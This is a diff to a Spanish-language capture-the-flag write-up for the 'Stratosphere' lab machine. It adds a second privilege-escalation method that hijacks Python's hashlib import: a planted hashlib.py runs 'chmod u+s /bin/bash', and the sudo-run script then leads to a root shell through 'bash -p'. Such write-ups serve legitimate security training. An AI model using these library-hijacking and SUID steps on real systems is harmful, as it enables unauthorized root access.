@@ -600,7 +600,7 @@ Last login: Sun Dec  3 12:20:42 2023 from 10.10.10.2
 richard@stratosphere:~$ whoami
 richard
 ```
-## Privilege Escalation
+## Privilege Escalation (First Method)
 
 Vemos que nuestro usuario puede ejecutar `python` con `sudo` siempre y cuando ejecute un archivo que está en nuestro directorio `/home`
 
@@ -645,4 +645,93 @@ Nos `convertimos` en usuario `root`
 ```
 richard@stratosphere:~$ sudo /usr/bin/python /home/richard/test.py 
 root@stratosphere:/home/richard# 
+```
+## Privilege Escalation (Second Method)
+
+Vemos que se están usando `librerías` sin indicar un `path` para ellas
+
+```
+richard@stratosphere:~$ cat test.py 
+#!/usr/bin/python3
+import hashlib
+
+
+def question():
+    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
+    md5 = hashlib.md5()
+    md5.update(q1.encode())
+    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
+        print("Sorry, that's not right")
+        return
+    print("You got it!")
+    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
+    sha1 = hashlib.sha1()
+    sha1.update(q2.encode())
+    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
+        print("Nope, that one didn't work...")
+        return
+    print("WOW, you're really good at this!")
+    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
+    md4 = hashlib.new('md4')
+    md4.update(q3.encode())
+    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
+        print("Yeah, I don't think that's right.")
+        return
+    print("OK, OK! I get it. You know how to crack hashes...")
+    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
+    blake = hashlib.new('BLAKE2b512')
+    blake.update(q4.encode())
+    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
+        print("You were so close! urg... sorry rules are rules.")
+        return
+
+    import os
+    os.system('/root/success.py')
+    return
+
+question()
+```
+
+`Imprimimos` el `path` de `python`, en este caso nos viene por defecto empezar a buscar las `librerías` en el `directorio actual`
+
+```
+richard@stratosphere:~$ python -c 'import sys; print(sys.path)'
+['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/gtk-2.0']
+```
+
+Nos creamos en el `directorio actual` la librería` hashlib.py` con el siguiente `contenido`
+
+```
+import os
+
+os.system('chmod u+s /bin/bash')
+```
+
+`Ejecutamos` el script
+
+```
+richard@stratosphere:~$ sudo /usr/bin/python3 /home/richard/test.py
+Solve: 5af003e100c80923ec04d65933d382cb
+
+Traceback (most recent call last):
+  File "/home/richard/test.py", line 38, in <module>
+    question()
+  File "/home/richard/test.py", line 7, in question
+    md5 = hashlib.md5()
+AttributeError: module 'hashlib' has no attribute 'md5'
+```
+
+`Comprobamos` que se haya `añadido` el `privilegio SUID` a la `bash`
+
+```
+richard@stratosphere:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+```
+
+`Ejecutamos` la `bash` como el `propietario` y nos `convertimos` en `root`
+
+```
+richard@stratosphere:~$ bash -p
+bash-5.0# whoami
+root
 ```
